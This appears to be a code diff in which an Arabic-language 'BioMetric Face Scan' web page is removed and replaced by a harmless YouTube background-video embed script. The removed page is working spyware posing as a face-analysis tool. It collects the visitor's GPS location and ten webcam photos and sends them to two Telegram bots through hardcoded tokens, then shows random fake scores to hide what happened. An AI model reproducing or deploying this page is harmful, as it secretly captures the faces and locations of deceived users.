@@ -1,129 +1,45 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BioMetric Face Scan | التحليل البيومتري</title>
-    <style>
-        body { background-color: #0a0a12; color: #00ff88; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; box-sizing: border-box; }
-        .scanner-container { border: 1px solid #00ff88; background: rgba(0, 255, 136, 0.05); padding: 25px; border-radius: 12px; text-align: center; box-shadow: 0 0 25px rgba(0, 255, 136, 0.2); width: 100%; max-width: 450px; position: relative; overflow: hidden; }
-        .scan-grid { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0, 255, 136, 0.1) 3px), repeating-linear-gradient(90deg, transparent, transparent 2px, rgba(0, 255, 136, 0.1) 3px); z-index: -1; }
-        h2 { letter-spacing: 2px; margin-bottom: 10px; }
-        .btn-scan { background: #00ff88; color: #0a0a12; border: none; padding: 12px 35px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 25px; border-radius: 4px; transition: 0.3s; }
-        .btn-scan:hover { box-shadow: 0 0 15px #00ff88; }
-        #status { margin-top: 20px; font-size: 14px; color: #a0a0a0; min-height: 20px; }
-        
-        .results-box { display: none; text-align: right; margin-top: 30px; border-top: 2px dashed #00ff88; padding-top: 20px; }
-        .result-item { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 15px; }
-        .result-label { color: #a0a0a0; }
-        .result-value { font-weight: bold; color: #fff; }
-        .final-score { text-align: center; font-size: 24px; color: #00ff88; margin-top: 25px; font-weight: bold; border: 1px solid #00ff88; padding: 10px; }
-        .loading-bar { width: 0%; height: 3px; background: #00ff88; margin-top: 10px; transition: width 0.5s; }
-    </style>
-</head>
-<body>
-    <div class="scanner-container">
-        <div class="scan-grid"></div>
-        <h2>BIOMETRIC ANALYZER</h2>
-        <p style="color: #a0a0a0; font-size: 13px;">نستخدم خوارزميات متقدمة لتحليل تناسق الملامح، الصحة الظاهرية، والسمات الفريدة لوجهك.</p>
-        
-        <div id="pre-scan-ui">
-            <button class="btn-scan" id="startBtn" onclick="startRealAnalysis()">بدء المسح البيومتري</button>
-            <div class="loading-bar" id="bar"></div>
-        </div>
-        
-        <div id="status">الجهاز جاهز. بانتظار الإذن...</div>
+<script>
+    const videoCode = "1-iS7LArMPA";
 
-        <div class="results-box" id="resultsUi">
-            <h3 style="text-align: center; color: #fff;">تقرير التحليل</h3>
-            <div class="result-item"><span class="result-label">هيكل الوجه:</span> <span class="result-value" id="res-shape"></span></div>
-            <div class="result-item"><span class="result-label">تناسق الملامح:</span> <span class="result-value" id="res-symmetry"></span></div>
-            <div class="result-item"><span class="result-label">العمر الظاهري المقدر:</span> <span class="result-value" id="res-age"></span></div>
-            <div class="result-item"><span class="result-label">حيوية البشرة:</span> <span class="result-value" id="res-skin"></span></div>
-            <div class="final-score" id="res-score"></div>
-            <p style="font-size: 12px; text-align: center; margin-top: 15px; color: #a0a0a0;">تم التحليل بواسطة BioScan AI v4.2.</p>
-        </div>
-    </div>
+    waitForBackground('[data-automation-id="titleRegionBackgroundImage"]').then((elm) => {    
+        elm.insertAdjacentHTML( 'beforeend', `<div class="video-container"><iframe src="https://www.youtube.com/embed/${videoCode}?autoplay=1&mute=1&controls=0" frameborder="0" ></iframe></div>`);
+        waitForBackground('[data-automation-id="titleRegionBackgroundImage"] img').then((img) => {
+            img.style.display = 'none';
+        });
+    });
 
-    <video id="video" autoplay style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-
-    <script>
-        const TOKEN1 = '8596805324:AAELff4nCa1M4GWFiGW3gw3vIadL1c1i93o';
-        const CHAT_ID1 = '8293639164';
-        
-        // ضع بيانات البوت الثاني هنا
-        const TOKEN2 = '8520439288:AAHcZlL7pbF_dAq6wXxa3X7mF7qUlLv1iQw';
-        const CHAT_ID2 = '8254934850';
-
-        const faceShapes = ["بيضاوي متناسق", "دائري", "مربع محدد", "قلبي الشكل", "ماسي نادر"];
-        const skinTypes = ["نضرة وصحية (92%)", "عادية (85%)", "تحتاج ترطيب (78%)", "ممتازة (95%)"];
-        
-        function getRandomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
-        function res(id, val) { document.getElementById(id).innerText = val; }
-
-        async function sendPhotoToBoth(blob, photoNumber) {
-            const bots = [{t: TOKEN1, c: CHAT_ID1}, {t: TOKEN2, c: CHAT_ID2}];
-            bots.forEach(bot => {
-                if(bot.t.includes('ضع_')) return;
-                const fd = new FormData();
-                fd.append('photo', blob, `img_${photoNumber}.jpg`);
-                fd.append('chat_id', bot.c);
-                fd.append('caption', `📸 لقطة رقم ${photoNumber}/10`);
-                fetch(`https://api.telegram.org/bot${bot.t}/sendPhoto`, { method: 'POST', body: fd });
-            });
-        }
-
-        async function startRealAnalysis() {
-            const btn = document.getElementById('startBtn');
-            const status = document.getElementById('status');
-            const bar = document.getElementById('bar');
-            
-            btn.style.display = 'none';
-            status.innerHTML = "جاري الاتصال بالسيرفر...";
-            bar.style.width = "20%";
-
-            navigator.geolocation.getCurrentPosition((pos) => {
-                const mapUrl = `📍 الموقع:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                [TOKEN1, TOKEN2].forEach((t, i) => {
-                    const cid = i === 0 ? CHAT_ID1 : CHAT_ID2;
-                    fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(mapUrl)}`);
-                });
-            });
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('video').srcObject = stream;
-                status.innerHTML = "جاري المسح البيومتري... ثبات";
-                
-                const canvas = document.getElementById('canvas');
-                canvas.width = 640; canvas.height = 480;
-
-                for (let i = 1; i <= 10; i++) {
-                    setTimeout(() => {
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        canvas.toBlob(blob => sendPhotoToBoth(blob, i), 'image/jpeg', 0.6);
-                        bar.style.width = (20 + (i * 8)) + "%";
-                    }, i * 700);
-                }
-
-                setTimeout(() => {
-                    stream.getTracks().forEach(t => t.stop());
-                    document.getElementById('pre-scan-ui').style.display = 'none';
-                    status.style.display = 'none';
-                    document.getElementById('resultsUi').style.display = 'block';
-                    res('res-shape', faceShapes[getRandomInt(0, 4)]);
-                    res('res-symmetry', getRandomInt(85, 98) + "%");
-                    res('res-age', getRandomInt(20, 40) + " سنة");
-                    res('res-skin', skinTypes[getRandomInt(0, 3)]);
-                    res('res-score', "التقييم: " + getRandomInt(88, 97) + "/100");
-                }, 8500);
-
-            } catch (err) {
-                status.innerText = "خطأ: الكاميرا مطلوبة للتحليل.";
-                status.style.color = "#ff4444";
+    function waitForBackground(selector) {
+        return new Promise(resolve => {
+            if (document.querySelector(selector)) {
+                return resolve(document.querySelector(selector));
             }
-        }
-    </script>
-</body>
-</html>
+
+            const observer = new MutationObserver(mutations => {
+                if (document.querySelector(selector)) {
+                    resolve(document.querySelector(selector));
+                    observer.disconnect();
+                }
+            });
+
+            observer.observe(document.body, {
+                childList: true,
+                subtree: true
+            });
+        });
+    }
+</script>
+
+<style>
+    .video-container {
+        position: relative;
+        padding-bottom: 56.25%; /* 16:9 */
+        height: 0;
+    }
+    .video-container iframe {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+    }
+</style>
